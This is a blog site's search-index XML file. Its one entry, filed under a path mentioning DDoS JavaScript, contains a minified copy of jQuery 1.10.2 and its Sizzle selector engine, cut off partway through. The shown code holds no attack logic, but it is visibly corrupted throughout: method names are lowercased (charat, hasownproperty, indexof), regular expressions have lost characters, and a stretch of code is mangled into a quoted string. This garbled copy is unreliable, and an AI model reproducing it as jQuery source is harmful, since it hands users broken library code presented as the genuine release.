<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2019/12/12/DDoS-Javascript/jquery-1.10.2.min/"/>
      <url>/2019/12/12/DDoS-Javascript/jquery-1.10.2.min/</url>
      
        <content type="html"><![CDATA[/*! jQuery v1.10.2 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license//@ sourceMappingURL=jquery-1.10.2.min.map*/(function(e,t){var n,r,i=typeof t,o=e.location,a=e.document,s=a.documentElement,l=e.jQuery,u=e.$,c={},p=[],f="1.10.2",d=p.concat,h=p.push,g=p.slice,m=p.indexOf,y=c.toString,v=c.hasOwnProperty,b=f.trim,x=function(e,t){return new x.fn.init(e,t,r)},w=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,T=/\S+/g,C=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,N=/^(?:\s*(<[\w\w]+>)[^>]*|#([\w-]*))$/,k=/^<(\w+)\s*\ ?>(?:<\ \1>|)$/,E=/^[\],:{}\s]*$/,S=/(?:^|:|,)(?:\s*\[)+/g,A=/\\(?:["\\\/bfnrt]|u[\da-fA-F]{4})/g,j=/"[^"\\\r\n]*"|true|false|null|-?(?:\d+\.|)\d+(?:[eE][+-]?\d+|)/g,D=/^-ms-/,L=/-([\da-z])/gi,H=function(e,t){return t.toUpperCase()},q=function(e){(a.addEventListener||"load"===e.type||"complete"===a.readyState)&&(_(),x.ready())},_=function(){a.addEventListener?(a.removeEventListener("DOMContentLoaded",q,!1),e.removeEventListener("load",q,!1)):(a.detachEvent("onreadystatechange",q),e.detachEvent("onload",q))};x.fn=x.prototype={jquery:f,constructor:x,init:function(e,n,r){var i,o;if(!e)return this;if("string"==typeof e){if(i="<"===e.charat(0)&&">"===e.charAt(e.length-1)&&e.length>=3?[null,e,null]:N.exec(e),!i||!i[1]&&n)return!n||n.jquery?(n||r).find(e):this.constructor(n).find(e);if(i[1]){if(n=n instanceof x?n[0]:n,x.merge(this,x.parseHTML(i[1],n&&n.nodeType?n.ownerDocument||n:a,!0)),k.test(i[1])&&x.isPlainObject(n))for(i in n)x.isFunction(this[i])?this[i](n[i]):this.attr(i,n[i]);return this}if(o=a.getElementById(i[2]),o&&o.parentNode){if(o.id!==i[2])return r.find(e);this.length=1,this[0]=o}return this.context=a,this.selector=e,this}return e.nodeType?(this.context=this[0]=e,this.length=1,this):x.isFunction(e)?r.ready(e):(e.selector!==t&&(this.selector=e.selector,this.context=e.context),x.makeArray(e,this))},selector:"",length:0,toArray:function(){return g.call(this)},get:function(e){return null==e?this.toArray():0>e?this[this.length+e]:this[e]},pushStack:function(e){var t=x.merge(this.constructor(),e);return t.prevObject=this,t.context=this.context,t},each:function(e,t){return x.each(this,e,t)},ready:function(e){return x.ready.promise().done(e),this},slice:function(){return this.pushStack(g.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(0>e?t:0);return this.pushStack(n>=0&&t>n?[this[n]]:[])},map:function(e){return this.pushStack(x.map(this,function(t,n){return e.call(t,n,t)}))},end:function(){return this.prevObject||this.constructor(null)},push:h,sort:[].sort,splice:[].splice},x.fn.init.prototype=x.fn,x.extend=x.fn.extend=function(){var e,n,r,i,o,a,s=arguments[0]||{},l=1,u=arguments.length,c=!1;for("boolean"==typeof s&&(c=s,s=arguments[1]||{},l=2),"object"==typeof s||x.isFunction(s)||(s={}),u===l&&(s=this,--l);u>l;l++)if(null!=(o=arguments[l]))for(i in o)e=s[i],r=o[i],s!==r&&(c&&r&&(x.isPlainObject(r)||(n=x.isArray(r)))?(n?(n=!1,a=e&&x.isArray(e)?e:[]):a=e&&x.isPlainObject(e)?e:{},s[i]=x.extend(c,a,r)):r!==t&&(s[i]=r));return s},x.extend({expando:"jQuery"+(f+Math.random()).replace(/\D/g,""),noConflict:function(t){return e.$===x&&(e.$=u),t&&e.jQuery===x&&(e.jQuery=l),x},isReady:!1,readyWait:1,holdReady:function(e){e?x.readyWait++:x.ready(!0)},ready:function(e){if(e===!0?!--x.readyWait:!x.isReady){if(!a.body)return setTimeout(x.ready);x.isReady=!0,e!==!0&&--x.readyWait>0||(n.resolveWith(a,[x]),x.fn.trigger&&x(a).trigger("ready").off("ready"))}},isFunction:function(e){return"function"===x.type(e)},isArray:Array.isArray||function(e){return"array"===x.type(e)},isWindow:function(e){return null!=e&&e==e.window},isNumeric:function(e){return!isNaN(parseFloat(e))&&isFinite(e)},type:function(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?c[y.call(e)]||"object":typeof e},isPlainObject:function(e){var n;if(!e||"object"!==x.type(e)||e.nodeType||x.isWindow(e))return!1;try{if(e.constructor&&!v.call(e,"constructor")&&!v.call(e.constructor.prototype,"isPrototypeOf"))return!1}catch(r){return!1}if(x.support.ownLast)for(n in e)return v.call(e,n);for(n in e);return n===t||v.call(e,n)},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},error:function(e){throw Error(e)},parseHTML:function(e,t,n){if(!e||"string"!=typeof e)return null;"boolean"==typeof t&&(n=t,t=!1),t=t||a;var r=k.exec(e),i=!n&&[];return r?[t.createElement(r[1])]:(r=x.buildFragment([e],t,i),i&&x(i).remove(),x.merge([],r.childNodes))},parseJSON:function(n){return e.JSON&&e.JSON.parse?e.JSON.parse(n):null===n?n:"string"==typeof n&&(n=x.trim(n),n&&E.test(n.replace(A,"@").replace(j,"]").replace(S,"")))?Function("return "+n)():(x.error("Invalid JSON: "+n),t)},parseXML:function(n){var r,i;if(!n||"string"!=typeof n)return null;try{e.DOMParser?(i=new DOMParser,r=i.parseFromString(n,"text/xml")):(r=new ActiveXObject("Microsoft.XMLDOM"),r.async="false",r.loadXML(n))}catch(o){r=t}return r&&r.documentElement&&!r.getElementsByTagName("parsererror").length||x.error("Invalid XML: "+n),r},noop:function(){},globalEval:function(t){t&&x.trim(t)&&(e.execScript||function(t){e.eval.call(e,t)})(t)},camelCase:function(e){return e.replace(D,"ms-").replace(L,H)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t,n){var r,i=0,o=e.length,a=M(e);if(n){if(a){for(;o>i;i++)if(r=t.apply(e[i],n),r===!1)break}else for(i in e)if(r=t.apply(e[i],n),r===!1)break}else if(a){for(;o>i;i++)if(r=t.call(e[i],i,e[i]),r===!1)break}else for(i in e)if(r=t.call(e[i],i,e[i]),r===!1)break;return e},trim:b&&!b.call("\ufeff\u00a0")?function(e){return null==e?"":b.call(e)}:function(e){return null==e?"":(e+"").replace(C,"")},makeArray:function(e,t){var n=t||[];return null!=e&&(M(Object(e))?x.merge(n,"string"==typeof e?[e]:e):h.call(n,e)),n},inArray:function(e,t,n){var r;if(t){if(m)return m.call(t,e,n);for(r=t.length,n=n?0>n?Math.max(0,r+n):n:0;r>n;n++)if(n in t&&t[n]===e)return n}return-1},merge:function(e,n){var r=n.length,i=e.length,o=0;if("number"==typeof r)for(;r>o;o++)e[i++]=n[o];else while(n[o]!==t)e[i++]=n[o++];return e.length=i,e},grep:function(e,t,n){var r,i=[],o=0,a=e.length;for(n=!!n;a>o;o++)r=!!t(e[o],o),n!==r&&i.push(e[o]);return i},map:function(e,t,n){var r,i=0,o=e.length,a=M(e),s=[];if(a)for(;o>i;i++)r=t(e[i],i,n),null!=r&&(s[s.length]=r);else for(i in e)r=t(e[i],i,n),null!=r&&(s[s.length]=r);return d.apply([],s)},guid:1,proxy:function(e,n){var r,i,o;return"string"==typeof n&&(o=e[n],n=e,e=o),x.isFunction(e)?(r=g.call(arguments,2),i=function(){return e.apply(n||this,r.concat(g.call(arguments)))},i.guid=e.guid=e.guid||x.guid++,i):t},access:function(e,n,r,i,o,a,s){var l=0,u=e.length,c=null==r;if("object"===x.type(r)){o=!0;for(l in r)x.access(e,n,l,r[l],!0,a,s)}else if(i!==t&&(o=!0,x.isFunction(i)||(s=!0),c&&(s?(n.call(e,i),n=null):(c=n,n=function(e,t,n){return c.call(x(e),n)})),n))for(;u>l;l++)n(e[l],r,s?i:i.call(e[l],l,n(e[l],r)));return o?e:c?n.call(e):u?n(e[0],r):a},now:function(){return(new Date).getTime()},swap:function(e,t,n,r){var i,o,a={};for(o in t)a[o]=e.style[o],e.style[o]=t[o];i=n.apply(e,r||[]);for(o in t)e.style[o]=a[o];return i}}),x.ready.promise=function(t){if(!n)if(n=x.Deferred(),"complete"===a.readyState)setTimeout(x.ready);else if(a.addEventListener)a.addEventListener("DOMContentLoaded",q,!1),e.addEventListener("load",q,!1);else{a.attachEvent("onreadystatechange",q),e.attachEvent("onload",q);var r=!1;try{r=null==e.frameElement&&a.documentElement}catch(i){}r&&r.doScroll&&function o(){if(!x.isReady){try{r.doScroll("left")}catch(e){return setTimeout(o,50)}_(),x.ready()}}()}return n.promise(t)},x.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(e,t){c["[object "+t+"]"]=t.toLowerCase()});function M(e){var t=e.length,n=x.type(e);return x.isWindow(e)?!1:1===e.nodeType&&t?!0:"array"===n||"function"!==n&&(0===t||"number"==typeof t&&t>0&&t-1 in e)}r=x(a),function(e,t){var n,r,i,o,a,s,l,u,c,p,f,d,h,g,m,y,v,b="sizzle"+-new Date,w=e.document,T=0,C=0,N=st(),k=st(),E=st(),S=!1,A=function(e,t){return e===t?(S=!0,0):0},j=typeof t,D=1<<31,l={}.hasownproperty,h=[],q=h.pop,_=h.push,m=h.push,o=h.slice,f=h.indexof||function(e){var t="0,n=this.length;for(;n">t;t++)if(this[t]===e)return t;return-1},B="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",P="[\\x20\\t\\r\\n\\f]",R="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",W=R.replace("w","w#"),$="\\["+P+"*("+R+")"+P+"*(?:([*^$|!~]?=)"+P+"*(?:(['\"])((?:\\\\.|[^\\\\])*?)\\3|("+W+")|)|)"+P+"*\\]",I=":("+R+")(?:\\(((['\"])((?:\\\\.|[^\\\\])*?)\\3|((?:\\\\.|[^\\\\()[\\]]|"+$.replace(3,8)+")*)|.*)\\)|)",z=RegExp("^"+P+"+|((?:^|[^\\\\])(?:\\\\.)*)"+P+"+$","g"),X=RegExp("^"+P+"*,"+P+"*"),U=RegExp("^"+P+"*([>+~]|"+P+")"+P+"*"),V=RegExp(P+"*[+~]"),Y=RegExp("="+P+"*([^\\]'\"]*)"+P+"*\\]","g"),J=RegExp(I),G=RegExp("^"+W+"$"),Q={ID:RegExp("^#("+R+")"),CLASS:RegExp("^\\.("+R+")"),TAG:RegExp("^("+R.replace("w","w*")+")"),ATTR:RegExp("^"+$),PSEUDO:RegExp("^"+I),CHILD:RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+P+"*(even|odd|(([+-]|)(\\d*)n|)"+P+"*(?:([+-]|)"+P+"*(\\d+)|))"+P+"*\\)|)","i"),bool:RegExp("^(?:"+B+")$","i"),needsContext:RegExp("^"+P+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+P+"*((?:-\\d)?\\d*)"+P+"*\\)|)(?=[^-]|$)","i")},K=/^[^{]+\{\s*\[native \w/,Z=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,et=/^(?:input|select|textarea|button)$/i,tt=/^h\d$/i,nt=/'|\\/g,rt=RegExp("\\\\([\\da-f]{1,6}"+P+"?|("+P+")|.)","ig"),it=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:0>r?String.fromCharCode(r+65536):String.fromCharCode(55296|r>>10,56320|1023&r)};try{M.apply(H=O.call(w.childNodes),w.childNodes),H[w.childNodes.length].nodeType}catch(ot){M={apply:H.length?function(e,t){_.apply(e,O.call(t))}:function(e,t){var n=e.length,r=0;while(e[n++]=t[r++]);e.length=n-1}}}function at(e,t,n,i){var o,a,s,l,u,c,d,m,y,x;if((t?t.ownerDocument||t:w)!==f&&p(t),t=t||f,n=n||[],!e||"string"!=typeof e)return n;if(1!==(l=t.nodeType)&&9!==l)return[];if(h&&!i){if(o=Z.exec(e))if(s=o[1]){if(9===l){if(a=t.getElementById(s),!a||!a.parentNode)return n;if(a.id===s)return n.push(a),n}else if(t.ownerDocument&&(a=t.ownerDocument.getElementById(s))&&v(t,a)&&a.id===s)return n.push(a),n}else{if(o[2])return M.apply(n,t.getElementsByTagName(e)),n;if((s=o[3])&&r.getElementsByClassName&&t.getElementsByClassName)return M.apply(n,t.getElementsByClassName(s)),n}if(r.qsa&&(!g||!g.test(e))){if(m=d=b,y=t,x=9===l&&e,1===l&&"object"!==t.nodeName.toLowerCase()){c=mt(e),(d=t.getAttribute("id"))?m=d.replace(nt,"\\$&"):t.setAttribute("id",m),m="[id='"+m+"'] ",u=c.length;while(u--)c[u]=m+yt(c[u]);y=V.test(e)&&t.parentNode||t,x=c.join(",")}if(x)try{return M.apply(n,y.querySelectorAll(x)),n}catch(T){}finally{d||t.removeAttribute("id")}}}return kt(e.replace(z,"$1"),t,n,i)}function st(){var e=[];function t(n,r){return e.push(n+=" ")>o.cacheLength&&delete t[e.shift()],t[n]=r}return t}function lt(e){return e[b]=!0,e}function ut(e){var t=f.createElement("div");try{return!!e(t)}catch(n){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function ct(e,t){var n=e.split("|"),r=e.length;while(r--)o.attrHandle[n[r]]=t}function pt(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&(~t.sourceIndex||D)-(~e.sourceIndex||D);if(r)return r;if(n)while(n=n.nextSibling)if(n===t)return-1;return e?1:-1}function ft(e){return function(t){var n=t.nodeName.toLowerCase();return"input"===n&&t.type===e}}function dt(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function ht(e){return lt(function(t){return t=+t,lt(function(n,r){var i,o=e([],n.length,t),a=o.length;while(a--)n[i=o[a]]&&(n[i]=!(r[i]=n[i]))})})}s=at.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return t?"HTML"!==t.nodeName:!1},r=at.support={},p=at.setDocument=function(e){var n=e?e.ownerDocument||e:w,i=n.defaultView;return n!==f&&9===n.nodeType&&n.documentElement?(f=n,d=n.documentElement,h=!s(n),i&&i.attachEvent&&i!==i.top&&i.attachEvent("onbeforeunload",function(){p()}),r.attributes=ut(function(e){return e.className="i",!e.getAttribute("className")}),r.getElementsByTagName=ut(function(e){return e.appendChild(n.createComment("")),!e.getElementsByTagName("*").length}),r.getElementsByClassName=ut(function(e){return e.innerHTML="<div class="a"></div><div class="a i"></div>",e.firstChild.className="i",2===e.getElementsByClassName("i").length}),r.getById=ut(function(e){return d.appendChild(e).id=b,!n.getElementsByName||!n.getElementsByName(b).length}),r.getById?(o.find.ID=function(e,t){if(typeof t.getElementById!==j&&h){var n=t.getElementById(e);return n&&n.parentNode?[n]:[]}},o.filter.ID=function(e){var t=e.replace(rt,it);return function(e){return e.getAttribute("id")===t}}):(delete o.find.ID,o.filter.ID=function(e){var t=e.replace(rt,it);return function(e){var n=typeof e.getAttributeNode!==j&&e.getAttributeNode("id");return n&&n.value===t}}),o.find.TAG=r.getElementsByTagName?function(e,n){return typeof n.getElementsByTagName!==j?n.getElementsByTagName(e):t}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){while(n=o[i++])1===n.nodeType&&r.push(n);return r}return o},o.find.CLASS=r.getElementsByClassName&&function(e,n){return typeof n.getElementsByClassName!==j&&h?n.getElementsByClassName(e):t},m=[],g=[],(r.qsa=K.test(n.querySelectorAll))&&(ut(function(e){e.innerHTML="<select><option selected></option></select>",e.querySelectorAll("[selected]").length||g.push("\\["+P+"*(?:value|"+B+")"),e.querySelectorAll(":checked").length||g.push(":checked")}),ut(function(e){var t=n.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("t",""),e.querySelectorAll("[t^='']").length&&g.push("[*^$]="+P+"*(?:''|\"\")"),e.querySelectorAll(":enabled").length||g.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),g.push(",.*:")})),(r.matchesSelector=K.test(y=d.webkitMatchesSelector||d.mozMatchesSelector||d.oMatchesSelector||d.msMatchesSelector))&&ut(function(e){r.disconnectedMatch=y.call(e,"div"),y.call(e,"[s!='']:x"),m.push("!=",I)}),g=g.length&&RegExp(g.join("|")),m=m.length&&RegExp(m.join("|")),v=K.test(d.contains)||d.compareDocumentPosition?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)while(t=t.parentNode)if(t===e)return!0;return!1},A=d.compareDocumentPosition?function(e,t){if(e===t)return S=!0,0;var i=t.compareDocumentPosition&&e.compareDocumentPosition&&e.compareDocumentPosition(t);return i?1&i||!r.sortDetached&&t.compareDocumentPosition(e)===i?e===n||v(w,e)?-1:t===n||v(w,t)?1:c?F.call(c,e)-F.call(c,t):0:4&i?-1:1:e.compareDocumentPosition?-1:1}:function(e,t){var r,i=0,o=e.parentNode,a=t.parentNode,s=[e],l=[t];if(e===t)return S=!0,0;if(!o||!a)return e===n?-1:t===n?1:o?-1:a?1:c?F.call(c,e)-F.call(c,t):0;if(o===a)return pt(e,t);r=e;while(r=r.parentNode)s.unshift(r);r=t;while(r=r.parentNode)l.unshift(r);while(s[i]===l[i])i++;return i?pt(s[i],l[i]):s[i]===w?-1:l[i]===w?1:0},n):f},at.matches=function(e,t){return at(e,null,null,t)},at.matchesSelector=function(e,t){if((e.ownerDocument||e)!==f&&p(e),t=t.replace(Y,"='$1']"),!(!r.matchesSelector||!h||m&&m.test(t)||g&&g.test(t)))try{var n=y.call(e,t);if(n||r.disconnectedMatch||e.document&&11!==e.document.nodeType)return n}catch(i){}return at(t,f,null,[e]).length>0},at.contains=function(e,t){return(e.ownerDocument||e)!==f&&p(e),v(e,t)},at.attr=function(e,n){(e.ownerDocument||e)!==f&&p(e);var i=o.attrHandle[n.toLowerCase()],a=i&&L.call(o.attrHandle,n.toLowerCase())?i(e,n,!h):t;return a===t?r.attributes||!h?e.getAttribute(n):(a=e.getAttributeNode(n))&&a.specified?a.value:null:a},at.error=function(e){throw Error("Syntax error, unrecognized expression: "+e)},at.uniqueSort=function(e){var t,n=[],i=0,o=0;if(S=!r.detectDuplicates,c=!r.sortStable&&e.slice(0),e.sort(A),S){while(t=e[o++])t===e[o]&&(i=n.push(o));while(i--)e.splice(n[i],1)}return e},a=at.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=a(e)}else if(3===i||4===i)return e.nodeValue}else for(;t=e[r];r++)n+=a(t);return n},o=at.selectors={cacheLength:50,createPseudo:lt,match:Q,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(rt,it),e[3]=(e[4]||e[5]||"").replace(rt,it),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||at.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&at.error(e[0]),e},PSEUDO:function(e){var n,r=!e[5]&&e[2];return Q.CHILD.test(e[0])?null:(e[3]&&e[4]!==t?e[2]=e[4]:r&&J.test(r)&&(n=mt(r,!0))&&(n=r.indexOf(")",r.length-n)-r.length)&&(e[0]=e[0].slice(0,n),e[2]=r.slice(0,n)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(rt,it).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=N[e+" "];return t||(t=RegExp("(^|"+P+")"+e+"("+P+"|$)"))&&N(e,function(e){return t.test("string"==typeof e.className&&e.className||typeof e.getAttribute!==j&&e.getAttribute("class")||"")})},ATTR:function(e,t,n){return function(r){var i=at.attr(r,e);return null==i?"!="===t:t?(i+="","="===t?i===n:"!="===t?i!==n:"^="===t?n&&0===i.indexOf(n):"*="===t?n&&i.indexOf(n)>-1:"$="===t?n&&i.slice(-n.length)===n:"~="===t?(" "+i+" ").indexOf(n)>-1:"|="===t?i===n||i.slice(0,n.length+1)===n+"-":!1):!0}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),a="last"!==e.slice(-4),s="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,l){var u,c,p,f,d,h,g=o!==a?"nextSibling":"previousSibling",m=t.parentNode,y=s&&t.nodeName.toLowerCase(),v=!l&&!s;if(m){if(o){while(g){p=t;while(p=p[g])if(s?p.nodeName.toLowerCase()===y:1===p.nodeType)return!1;h=g="only"===e&&!h&&"nextSibling"}return!0}if(h=[a?m.firstChild:m.lastChild],a&&v){c=m[b]||(m[b]={}),u=c[e]||[],d=u[0]===T&&u[1],f=u[0]===T&&u[2],p=d&&m.childNodes[d];while(p=++d&&p&&p[g]||(f=d=0)||h.pop())if(1===p.nodeType&&++f&&p===t){c[e]=[T,d,f];break}}else if(v&&(u=(t[b]||(t[b]={}))[e])&&u[0]===T)f=u[1];else while(p=++d&&p&&p[g]||(f=d=0)||h.pop())if((s?p.nodeName.toLowerCase()===y:1===p.nodeType)&&++f&&(v&&((p[b]||(p[b]={}))[e]=[T,f]),p===t))break;return f-=i,f===r||0===f%r&&f/r>=0}}},PSEUDO:function(e,t){var n,r=o.pseudos[e]||o.setFilters[e.toLowerCase()]||at.error("unsupported pseudo: "+e);return r[b]?r(t):r.length>1?(n=[e,e,"",t],o.setFilters.hasOwnProperty(e.toLowerCase())?lt(function(e,n){var i,o=r(e,t),a=o.length;while(a--)i=F.call(e,o[a]),e[i]=!(n[i]=o[a])}):function(e){return r(e,0,n)}):r}},pseudos:{not:lt(function(e){var t=[],n=[],r=l(e.replace(z,"$1"));return r[b]?lt(function(e,t,n,i){var o,a=r(e,null,i,[]),s=e.length;while(s--)(o=a[s])&&(e[s]=!(t[s]=o))}):function(e,i,o){return t[0]=e,r(t,null,o,n),!n.pop()}}),has:lt(function(e){return function(t){return at(e,t).length>0}}),contains:lt(function(e){return function(t){return(t.textContent||t.innerText||a(t)).indexOf(e)>-1}}),lang:lt(function(e){return G.test(e||"")||at.error("unsupported lang: "+e),e=e.replace(rt,it).toLowerCase(),function(t){var n;do if(n=h?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return n=n.toLowerCase(),n===e||0===n.indexOf(e+"-");while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===d},focus:function(e){return e===f.activeElement&&(!f.hasFocus||f.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return e.disabled===!1},disabled:function(e){return e.disabled===!0},checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeName>"@"||3===e.nodeType||4===e.nodeType)return!1;return!0},parent:function(e){return!o.pseudos.empty(e)},header:function(e){return tt.test(e.nodeName)},input:function(e){return et.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||t.toLowerCase()===e.type)},first:ht(function(){return[0]}),last:ht(function(e,t){return[t-1]}),eq:ht(function(e,t,n){return[0>n?n+t:n]}),even:ht(function(e,t){var n=0;for(;t>n;n+=2)e.push(n);return e}),odd:ht(function(e,t){var n=1;for(;t>n;n+=2)e.push(n);return e}),lt:ht(function(e,t,n){var r=0>n?n+t:n;for(;--r>=0;)e.push(r);return e}),gt:ht(function(e,t,n){var r=0>n?n+t:n;for(;t>++r;)e.push(r);return e})}},o.pseudos.nth=o.pseudos.eq;for(n in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})o.pseudos[n]=ft(n);for(n in{submit:!0,reset:!0})o.pseudos[n]=dt(n);function gt(){}gt.prototype=o.filters=o.pseudos,o.setFilters=new gt;function mt(e,t){var n,r,i,a,s,l,u,c=k[e+" "];if(c)return t?0:c.slice(0);s=e,l=[],u=o.preFilter;while(s){(!n||(r=X.exec(s)))&&(r&&(s=s.slice(r[0].length)||s),l.push(i=[])),n=!1,(r=U.exec(s))&&(n=r.shift(),i.push({value:n,type:r[0].replace(z," ")}),s=s.slice(n.length));for(a in o.filter)!(r=Q[a].exec(s))||u[a]&&!(r=u[a](r))||(n=r.shift(),i.push({value:n,type:a,matches:r}),s=s.slice(n.length));if(!n)break}return t?s.length:s?at.error(e):k(e,l).slice(0)}function yt(e){var t=0,n=e.length,r="";for(;n>t;t++)r+=e[t].value;return r}function vt(e,t,n){var r=t.dir,o=n&&"parentNode"===r,a=C++;return t.first?function(t,n,i){while(t=t[r])if(1===t.nodeType||o)return e(t,n,i)}:function(t,n,s){var l,u,c,p=T+" "+a;if(s){while(t=t[r])if((1===t.nodeType||o)&&e(t,n,s))return!0}else while(t=t[r])if(1===t.nodeType||o)if(c=t[b]||(t[b]={}),(u=c[r])&&u[0]===p){if((l=u[1])===!0||l===i)return l===!0}else if(u=c[r]=[p],u[1]=e(t,n,s)||i,u[1]===!0)return!0}}function bt(e){return e.length>1?function(t,n,r){var i=e.length;while(i--)if(!e[i](t,n,r))return!1;return!0}:e[0]}function xt(e,t,n,r,i){var o,a=[],s=0,l=e.length,u=null!=t;for(;l>s;s++)(o=e[s])&&(!n||n(o,r,i))&&(a.push(o),u&&t.push(s));return a}function wt(e,t,n,r,i,o){return r&&!r[b]&&(r=wt(r)),i&&!i[b]&&(i=wt(i,o)),lt(function(o,a,s,l){var u,c,p,f=[],d=[],h=a.length,g=o||Nt(t||"*",s.nodeType?[s]:s,[]),m=!e||!o&&t?g:xt(g,f,e,s,l),y=n?i||(o?e:h||r)?[]:a:m;if(n&&n(m,y,s,l),r){u=xt(y,d),r(u,[],s,l),c=u.length;while(c--)(p=u[c])&&(y[d[c]]=!(m[d[c]]=p))}if(o){if(i||e){if(i){u=[],c=y.length;while(c--)(p=y[c])&&u.push(m[c]=p);i(null,y=[],u,l)}c=y.length;while(c--)(p=y[c])&&(u=i?F.call(o,p):f[c])>-1&&(o[u]=!(a[u]=p))}}else y=xt(y===a?y.splice(h,y.length):y),i?i(null,a,y,l):M.apply(a,y)})}function Tt(e){var t,n,r,i=e.length,a=o.relative[e[0].type],s=a||o.relative[" "],l=a?1:0,c=vt(function(e){return e===t},s,!0),p=vt(function(e){return F.call(t,e)>-1},s,!0),f=[function(e,n,r){return!a&&(r||n!==u)||((t=n).nodeType?c(e,n,r):p(e,n,r))}];for(;i>l;l++)if(n=o.relative[e[l].type])f=[vt(bt(f),n)];else{if(n=o.filter[e[l].type].apply(null,e[l].matches),n[b]){for(r=++l;i>r;r++)if(o.relative[e[r].type])break;return wt(l>1&&bt(f),l>1&&yt(e.slice(0,l-1).concat({value:" "===e[l-2].type?"*":""})).replace(z,"$1"),n,r>l&&Tt(e.slice(l,r)),i>r&&Tt(e=e.slice(r)),i>r&&yt(e))}f.push(n)}return bt(f)}function Ct(e,t){var n=0,r=t.length>0,a=e.length>0,s=function(s,l,c,p,d){var h,g,m,y=[],v=0,b="0",x=s&&[],w=null!=d,C=u,N=s||a&&o.find.TAG("*",d&&l.parentNode||l),k=T+=null==C?1:Math.random()||.1;for(w&&(u=l!==f&&l,i=n);null!=(h=N[b]);b++){if(a&&h){g=0;while(m=e[g++])if(m(h,l,c)){p.push(h);break}w&&(T=k,i=++n)}r&&((h=!m&&h)&&v--,s&&x.push(h))}if(v+=b,r&&b!==v){g=0;while(m=t[g++])m(x,y,l,c);if(s){if(v>0)while(b--)x[b]||y[b]||(y[b]=q.call(p));y=xt(y)}M.apply(p,y),w&&!s&&y.length>0&&v+t.length>1&&at.uniqueSort(p)}return w&&(T=k,u=C),x};return r?lt(s):s}l=at.compile=function(e,t){var n,r=[],i=[],o=E[e+" "];if(!o){t||(t=mt(e)),n=t.length;while(n--)o=Tt(t[n]),o[b]?r.push(o):i.push(o);o=E(e,Ct(i,r))}return o};function Nt(e,t,n){var r=0,i=t.length;for(;i>r;r++)at(e,t[r],n);return n}function kt(e,t,n,i){var a,s,u,c,p,f=mt(e);if(!i&&1===f.length){if(s=f[0]=f[0].slice(0),s.length>2&&"ID"===(u=s[0]).type&&r.getById&&9===t.nodeType&&h&&o.relative[s[1].type]){if(t=(o.find.ID(u.matches[0].replace(rt,it),t)||[])[0],!t)return n;e=e.slice(s.shift().value.length)}a=Q.needsContext.test(e)?0:s.length;while(a--){if(u=s[a],o.relative[c=u.type])break;if((p=o.find[c])&&(i=p(u.matches[0].replace(rt,it),V.test(s[0].type)&&t.parentNode||t))){if(s.splice(a,1),e=i.length&&yt(s),!e)return M.apply(n,i),n;break}}}return l(e,f)(i,t,!h,n,V.test(e)),n}r.sortStable=b.split("").sort(A).join("")===b,r.detectDuplicates=S,p(),r.sortDetached=ut(function(e){return 1&e.compareDocumentPosition(f.createElement("div"))}),ut(function(e){return e.innerHTML="<a 